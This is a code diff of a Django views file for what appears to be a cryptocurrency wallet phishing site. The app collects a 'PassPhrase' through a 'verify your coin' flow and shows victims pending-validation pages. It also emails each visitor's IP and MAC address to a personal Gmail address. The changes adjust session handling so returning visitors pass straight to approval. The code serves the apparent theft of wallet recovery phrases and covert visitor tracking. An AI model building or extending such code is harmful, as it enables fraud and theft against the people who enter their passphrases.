@@ -71,6 +71,9 @@ to get location data
 def index(request):
     ip_add = get_ip_address()
     request.session['ip_address'] = ip_add
+    key = request.session.get('look_up', None)
+    if key:
+         return approve(request, keys=key)
     mac_add  = get_mac_address()
     send_notify(payload=f'someone has visited your pi site - IP = {ip_add}, Mac_add = {mac_add} ', subject='Pi site', email_to="ezekielobiajulu0@gmail.com")
 
@@ -127,32 +130,12 @@ def submit_pass(request):
                 return approve(request, keys=look_up_key)
         
     else:
+        look = request.session.get('look_up', None)
+        if look:
+            return approve(request, keys=look)
         return redirect('/')
 
 
-def verify_your_coin(request, keys = None):
-    if keys == None:
-        key = request.session.get('look_up', None)
-
-        if key:
-            look_up = models.PassPhrase.objects.filter(look_up=key).first()
-            if look_up:
-                if look_up.is_verified:
-                    return render(request, 'verification.html', {})
-                else:
-                    messages.error(request, 'We are validating your info')
-                    # return redirect('/wallet/')
-                    return render(request, 'pending_verify.html', {})
-            else:
-                messages.error(request, 'Invalid Key')
-                return redirect('/wallet/')
-
-        else:
-            messages.error(request, 'Invalid Key')
-            return redirect('/wallet/')
-    else:
-        return redirect('/')
-        # return render(request, 'verification.html', {})
 
 def approve(request, keys = None):
     if keys == None:
@@ -166,3 +149,37 @@ def approve(request, keys = None):
             messages.error(request, 'Please Enter Your PassPhrase')
             return redirect('/wallet/')
     
+
+
+
+def verify_your_coin(request, keys = None):
+    if keys == None:
+        key = request.session.get('look_up', None)
+
+        if key:
+            look_up = models.PassPhrase.objects.filter(look_up=key).first()
+            if look_up:
+                if look_up.is_verified:
+                    if "look_up" in request.session:
+                        del request.session['look_up']
+                    return render(request, 'verification.html', {})
+                else:
+                    messages.error(request, 'We are validating your info')
+                    # return redirect('/wallet/')
+                    if "look_up" in request.session:
+                        del request.session['look_up']
+                    return render(request, 'pending_verify.html', {})
+            else:
+                messages.error(request, 'Invalid Key')
+                return redirect('/wallet/')
+
+        else:
+            messages.error(request, 'Invalid Key')
+            return redirect('/wallet/')
+    else:
+        if 'look_up' in request.session:
+            del request.session['look_up']
+        # request.session.pop('look_up', None)
+
+        return redirect('/')
+        # return render(request, 'verification.html', {})
